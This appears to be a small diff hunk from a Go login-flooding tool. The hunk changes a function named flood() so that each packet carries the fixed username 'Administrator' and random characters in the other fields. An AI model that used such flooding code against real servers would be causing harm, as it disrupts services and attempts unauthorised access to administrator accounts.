@@ -58,7 +58,7 @@ func init() {
 
 func flood() {
 	addr := host + ":" + port
-	peket := Construct_LoginPacket(string(abcd[rand.Intn(len(abcd))]), string(abcd[rand.Intn(len(abcd))]), string(abcd[rand.Intn(len(abcd))]))
+	peket := Construct_LoginPacket("Administrator", string(abcd[rand.Intn(len(abcd))]), string(abcd[rand.Intn(len(abcd))]))
 	var s net.Conn
 	var err error
 	<-start
